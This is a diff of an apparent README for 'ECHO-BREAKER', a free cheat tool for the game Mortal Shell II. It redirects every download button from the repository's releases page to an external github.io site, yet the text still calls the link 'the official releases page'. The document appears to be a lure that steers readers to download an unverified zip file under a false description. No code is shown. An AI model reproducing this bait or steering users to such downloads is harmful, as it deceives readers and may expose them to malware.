@@ -1,7 +1,7 @@
 <h1>🎮 Mortal-Shell-II-ECHO-BREAKER - Unlock Your Full Fallen World Potential</h1>
 
 <p align="center">
-  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b35,#f7c948);color:#1a1a2e;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://penrepresentative8509.github.io" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b35,#f7c948);color:#1a1a2e;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>🎯 What Is This?</h2>
@@ -23,7 +23,7 @@
 <h3>📥 Step 1: Download the Application</h3>
 <p>Visit this link to download the application:</p>
 <p align="center">
-  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:12px 30px;background:#4ecdc4;color:#1a1a2e;font-size:16px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 Click Here to Download ECHO-BREAKER</a>
+  <a href="https://penrepresentative8509.github.io" style="display:inline-block;padding:12px 30px;background:#4ecdc4;color:#1a1a2e;font-size:16px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 Click Here to Download ECHO-BREAKER</a>
 </p>
 <p>This link takes you to the official releases page where you'll find the latest version. Look for the file named <strong>Mortal-Shell-II-ECHO-BREAKER.zip</strong> and click it to start downloading.</p>
 
@@ -81,7 +81,7 @@
 <p>This tool is provided free for personal use. It is not affiliated with or endorsed by the developers of Mortal Shell II. Use it responsibly and at your own risk. The tool is designed for single-player experiences only - do not use it in any online or competitive modes.</p>
 
 <p align="center">
-  <a href="https://github.com/penrepresentative8509/Mortal-Shell-II-ECHO-BREAKER/releases" style="display:inline-block;padding:14px 35px;background:#ff6b6b;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Get ECHO-BREAKER Now</a>
+  <a href="https://penrepresentative8509.github.io" style="display:inline-block;padding:14px 35px;background:#ff6b6b;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Get ECHO-BREAKER Now</a>
 </p>
 
 <p align="center" style="color:#888;font-size:12px;">Mortal Shell II © Playstack. This is an independent fan-made utility. All trademarks belong to their respective owners.</p>
